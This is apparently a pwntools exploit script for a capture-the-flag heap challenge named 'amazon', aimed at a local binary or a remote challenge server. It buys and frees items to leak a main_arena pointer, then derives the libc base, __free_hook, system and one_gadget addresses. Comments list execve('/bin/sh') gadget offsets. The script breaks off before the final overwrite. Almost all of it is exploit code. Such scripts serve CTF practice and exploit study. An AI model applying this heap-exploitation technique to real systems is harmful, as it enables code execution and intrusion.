#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./amazon')
if local:
    p = process('./amazon')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def buy(item,num,size,content):
    ru("Your choice: ")
    sl('1')
    ru("What item do you want to buy: ")
    sl(str(item))
    ru("How many: ")
    sl(str(num))
    ru("How long is your note: ")
    sl(str(size))
    ru("Content: ")
    sd(content)
def free(item):
    ru("Your choice: ")
    sl('3')
    ru("Which item are you going to pay for: ")
    sl(str(item))
def show():
    ru("Your choice: ")
    sl('2')
for i in range(10):
    buy(1,0x11,0x100,'a'*0x100)
for i in range(8):
    free(i)
# bk(0)
show()
for i in range(8):
    ru("Name:")
main_arena = u64(rc(9)[1:-2].ljust(8,'\x00'))
print "main_arena--->" + hex(main_arena)
libc_base = main_arena - 0x3ebca0
free_hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
onegadget = libc_base + 0x10a38c

p.interactive()

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
